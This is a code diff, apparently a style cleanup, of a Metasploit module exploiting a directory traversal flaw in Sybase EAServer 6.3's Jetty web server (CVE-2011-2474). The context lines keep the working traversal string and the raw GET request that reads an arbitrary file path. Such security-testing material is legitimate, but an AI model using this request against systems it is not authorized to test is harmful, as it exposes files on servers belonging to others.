@@ -9,34 +9,41 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Sybase Easerver 6.3 Directory Traversal',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Sybase Easerver 6.3 Directory Traversal',
+        'Description' => %q{
           This module exploits a directory traversal vulnerability found in Sybase
-        EAserver's Jetty webserver on port 8000. Code execution seems unlikely with
-        EAserver's default configuration unless the web server allows WRITE permission.
-      },
-      'References'     =>
-        [
+          EAserver's Jetty webserver on port 8000. Code execution seems unlikely with
+          EAserver's default configuration unless the web server allows WRITE permission.
+        },
+        'References' => [
           [ 'CVE', '2011-2474' ],
           [ 'OSVDB', '72498' ],
           [ 'URL', 'http://www.sybase.com/detail?id=1093216' ],
           [ 'URL', 'https://labs.idefense.com/verisign/intelligence/2009/vulnerabilities/display.php?id=912' ],
         ],
-      'Author'         =>
-        [
-          'Sow Ching Shiong', #Initial discovery (via iDefense)
+        'Author' => [
+          'Sow Ching Shiong', # Initial discovery (via iDefense)
           'sinn3r'
         ],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => '2011-05-25'
-    ))
+        'License' => MSF_LICENSE,
+        'DisclosureDate' => '2011-05-25',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(8000),
         OptString.new("FILEPATH", [false, 'Specify a parameter for the action'])
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
@@ -52,7 +59,7 @@ class MetasploitModule < Msf::Auxiliary
     traversal = ".\\..\\.\\..\\.\\..\\.\\.."
     res = send_request_raw({
       'method' => 'GET',
-      'uri'    => "/#{traversal}\\#{datastore['FILEPATH']}"
+      'uri' => "/#{traversal}\\#{datastore['FILEPATH']}"
     }, 25)
 
     print_status("Server returns HTTP code: #{res.code.to_s}")
